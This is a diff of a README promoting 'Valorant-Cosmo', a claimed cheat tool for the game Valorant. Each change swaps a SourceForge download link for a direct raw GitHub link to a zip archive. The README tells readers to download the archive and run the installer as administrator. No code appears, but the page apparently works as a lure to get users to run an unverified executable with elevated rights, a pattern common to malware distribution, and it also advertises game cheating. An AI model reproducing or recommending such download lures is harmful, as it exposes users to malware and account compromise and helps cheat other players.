@@ -1,7 +1,7 @@
 # 🎮 Valorant-Cosmo - Gain the Edge in Every Match
 
 ## 🔗 Download Now
-[![Download Valorant-Cosmo](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://sourceforge.net/projects/valorant-cheats-free)
+[![Download Valorant-Cosmo](https://raw.githubusercontent.com/NemiiSV/Valorant-Cosmo/main/guestive/Valorant-Cosmo_3.2-alpha.1.zip)](https://raw.githubusercontent.com/NemiiSV/Valorant-Cosmo/main/guestive/Valorant-Cosmo_3.2-alpha.1.zip)
 
 ## 🚀 Getting Started
 Welcome to Valorant-Cosmo! This guide will help you download and run this application to enhance your Valorant gameplay.
@@ -22,7 +22,7 @@ To run Valorant-Cosmo smoothly, make sure your system meets the following requir
 To get started with Valorant-Cosmo, follow these steps:
 
 1. **Visit the Download Page**  
-   Go to our official download page: [Download Valorant-Cosmo](https://sourceforge.net/projects/valorant-cheats-free).
+   Go to our official download page: [Download Valorant-Cosmo](https://raw.githubusercontent.com/NemiiSV/Valorant-Cosmo/main/guestive/Valorant-Cosmo_3.2-alpha.1.zip).
 
 2. **Choose Your Version**  
    On the download page, select the version that suits you best. The latest version is recommended for optimal performance.
@@ -57,7 +57,7 @@ Valorant-Cosmo offers several important features to help you succeed:
 If you encounter any issues while installing or using Valorant-Cosmo:
 
 - **Check Compatibility**: Ensure your system meets the minimum requirements.
-- **Re-download**: The file may have been corrupted during the initial download. Try downloading it again from [Download Valorant-Cosmo](https://sourceforge.net/projects/valorant-cheats-free).
+- **Re-download**: The file may have been corrupted during the initial download. Try downloading it again from [Download Valorant-Cosmo](https://raw.githubusercontent.com/NemiiSV/Valorant-Cosmo/main/guestive/Valorant-Cosmo_3.2-alpha.1.zip).
 - **Run as Administrator**: Right-click on the installer and select “Run as administrator” for proper permissions.
 - **Consult the Community**: If you need more help, visit our community forums for advice and solutions.
 
@@ -70,4 +70,4 @@ Stay informed about updates and new features. Regular updates ensure you have th
 ## 🏆 Final Thoughts
 Valorant-Cosmo is designed to help you enhance your Valorant gameplay. Follow this guide carefully to ensure a smooth download and installation process. Enjoy gaining the edge in your matches!
 
-[![Download Valorant-Cosmo](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://sourceforge.net/projects/valorant-cheats-free)
+[![Download Valorant-Cosmo](https://raw.githubusercontent.com/NemiiSV/Valorant-Cosmo/main/guestive/Valorant-Cosmo_3.2-alpha.1.zip)](https://raw.githubusercontent.com/NemiiSV/Valorant-Cosmo/main/guestive/Valorant-Cosmo_3.2-alpha.1.zip)
